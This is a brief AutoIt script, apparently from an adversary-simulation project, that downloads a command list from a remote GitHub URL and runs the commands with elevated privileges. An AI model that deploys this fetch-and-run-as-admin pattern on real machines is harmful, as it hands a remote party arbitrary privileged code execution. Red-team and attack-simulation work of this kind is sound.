#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/misc.au3"

$commands = ReadRemoteVar('https://raw.githubusercontent.com/filippostz/APT-SimulActor/master/etc/commands.txt')

RunElevated($commands)